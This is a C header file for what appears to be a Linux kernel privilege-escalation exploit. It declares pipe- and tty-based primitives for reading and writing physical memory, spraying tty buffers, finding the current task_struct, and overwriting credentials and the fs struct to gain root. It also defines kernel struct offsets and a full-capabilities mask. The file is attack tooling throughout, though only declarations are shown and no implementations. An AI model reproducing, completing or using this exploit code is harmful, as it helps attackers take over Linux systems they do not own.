#ifndef RW_PIPE_AND_TTY_H
#define RW_PIPE_AND_TTY_H

#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>

#include "../config.h"

#define PIPE_BUF_FLAG_CAN_MERGE	0x10
#define FULL_CAPS 0x000001ffffffffffUL
#define RW_PITY_CHECK_RW_PTR(ptr, size) ({			\
    uint64_t __ptr = (uint64_t)(ptr);          			\
    uint64_t __size = (uint64_t)(size);				\
    if (unlikely(__size >= PAGE_SZ))				\
	err(1, "Cannot read more than one page");		\
    if (unlikely(PAGE_ALIGN(__ptr) + 0xFFF - __ptr < __size))	\
	err(1, "Cannot read last byte of page");		\
    })

struct task_struct_offsets {
  uint64_t comm;
  uint64_t fs;
  uint64_t seccomp;
  uint64_t nsproxy;
  uint64_t cred;
  uint64_t thread_info;
  uint64_t __align;
};

struct cred_offsets {
  uint64_t uid;
  uint64_t cap_inheritable;
  uint64_t securebits; // ends ids
  uint64_t jit_keyring; // ends capabilities
};

extern struct task_struct_offsets task_struct_offsets;
extern struct cred_offsets cred_offsets;

extern void rw_pity_init(void);

extern void rw_pity_spray_tty_write_buf(void);

extern int rw_pity_identify_pair(int (*pipes)[2], int num_pipes,
    			       int* ttys, int num_ttys);

extern void* rw_pity_read_phys_page(uint64_t paddr, void* leak);

extern uint64_t rw_pity_scan_physmem_range(uint64_t paddr, uint64_t len,
    void* needle_buf, uint64_t needle_buf_sz, uint64_t align, int dir,
    bool (*validate_match)(uint64_t));

extern void rw_pity_write(uint64_t paddr, size_t len, void* buf);

extern uint64_t rw_pity_read_qword(uint64_t paddr);

extern uint64_t rw_pity_search_my_task_struct(uint64_t heap_ptr);

extern void rw_pity_privesc_creds(uint64_t task_struct);

extern void rw_pity_privesc_fs(uint64_t task_struct);

#endif // RW_PIPE_AND_TTY_H
